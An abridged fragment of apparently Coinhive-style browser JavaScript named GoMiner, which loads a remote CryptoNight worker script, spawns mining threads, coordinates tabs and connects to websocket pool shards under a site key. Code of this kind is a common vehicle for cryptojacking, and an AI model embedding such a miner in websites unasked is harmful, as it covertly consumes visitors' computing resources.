(function(window) {
    ...
    Miner.prototype.start = function(mode) {
        this._tab.mode = mode || GoMiner.IF_EXCLUSIVE_TAB;
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function() {
                GoMiner.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", GoMiner.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
            xhr.send()
        }
    };
    ...
    Miner.prototype.setNumThreads = function(num) {
        ...
        if (num > this._threads.length) {
            for (var i = 0; num > this._threads.length; i++) {
                var thread = new GoMiner.JobThread;
                if (this._currentJob) {
    ...
    Miner.prototype._startNow = function() {
        if (this._tab.mode !== GoMiner.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
        }
        if (this._tab.mode === GoMiner.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        if (this._tab.mode === GoMiner.FORCE_EXCLUSIVE_TAB) {
            this._tab.grace = Date.now() + 3e3
        }
        if (!this.verifyThread) {
            this.verifyThread = new GoMiner.JobThread
        }
    ...
    Miner.prototype._connect = function() {
        ...
        var shards = GoMiner.CONFIG.WEBSOCKET_SHARDS;
    ...
    window.GoMiner = window.GoMiner || {};
    window.GoMiner.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.GoMiner.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.GoMiner.FORCE_MULTI_TAB = "forceMultiTab";
    window.GoMiner.Token = function(siteKey, goal, params) {
        var miner = new Miner(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
    window.GoMiner.User = function(siteKey, user, params) {
        var miner = new Miner(siteKey, params);
        miner._user = user;
        return miner
    };
    window.GoMiner.Anonymous = function(siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    }
})(window);
(function(window) {
    ...
    var JobThread = function() {
        this.worker = new Worker(GoMiner.CRYPTONIGHT_WORKER_BLOB);
